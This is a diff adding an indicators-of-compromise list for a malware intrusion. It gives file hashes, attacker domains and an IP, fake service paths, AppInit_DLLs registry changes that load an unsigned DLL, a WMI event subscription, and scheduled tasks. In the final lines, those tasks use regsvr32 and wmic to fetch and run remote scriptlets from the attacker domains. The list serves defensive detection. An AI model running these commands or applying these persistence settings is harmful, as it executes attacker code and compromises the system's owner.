@@ -1,0 +1,39 @@
+MD5 (net.xsl) = 45f4159b48e9ae9aa732456f38120eda
+MD5 (networks.xsl) = cb935c57f622b2e78e777b3de3848d1
+MD5 (./SecureAssessmentHandlerstor.dll) = 9be14da13af02ef784fa043e7dc6a575
+MD5 (./access.txt) = 40c5ee01a61634574919370e1f292618
+MD5 (./cohernece.txt) = a2461833f88901ebe9099da778bd460c
+MD5 (./min.txt) = a3fe0ba63067b7d083ba45346259964f
+MD5 (./mon.txt) = e84b174ff9b961cb2a207950523cfc50
+MD5 (./networks.ps1.txt) = 06efa98e5fee566bb1a9ef4b36abff34
+MD5 (./nssm.txt) = 516762abfd035571be957076e7477239
+MD5 (./services.exe) = 31cbc246c3fbceee92ee42261257c0aa
+MD5 (./shellcode.bin) = 80901ffe167bcc1d96baea11b0196478
+MD5 (./sys.txt) = 61ffbad80968970213a29c663291c225
+MD5 (./uas.txt) = fbef643bd81372e8ed6a295ab032dc7
+
+cat.xiaojiji.nl
+cat.dashabi.in
+cat.xiaoshabi.nl
+cat.xiaojiji.nl
+5.180.96.187
+
+Service (Event Logs) = c:\ProgramData\Microsoft\Network\Downloader\services.exe
+Service (Event Service) = c:\ProgramData\Microsoft\Network\Connections\services.exe
+
+c:\ProgramData\Microsoft\Network\Connections\OSFMount.sys
+c:\ProgramData\Microsoft\Windows\WER\cmd.exe
+c:\ProgramData\Microsoft\Windows\Caches\SecureAssessmentHandlerstor.dll
+
+REG (hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,RequireSignedAppInit_DLLs) = 0
+REG (hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,LoadAppInit_DLLs) = 1
+REG (hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows,AppInit_DLLs) = c:\ProgramData\Microsoft\Windows\Caches\SecureAssessmentHandlerstor.dll
+
+[WmiClass] 'root\default:System_Anti_Virus_Core'
+
+WmiEventSubscription (WmiFilterName = Windows Events Filter, WmiConsumerName = Windows Events Consumer)
+
+ScheduledTask (Microsoft\Windows\MUI\LMRemove) = regsvr32 /u /s /i:http://cat.dashabi.in/networks.xsl scrobj.dll
+ScheduledTask (Microsoft\Windows\Multimedia\SystemEventService) = regsvr32 /u /s /i:http://cat.xiaojiji.nl/networks.xsl scrobj.dll
+ScheduledTask (Microsoft\Windows\RAC\RacTaskMgr) = wmic os get /format:'http://cat.xiaojiji.nl/net/net.xsl'
+
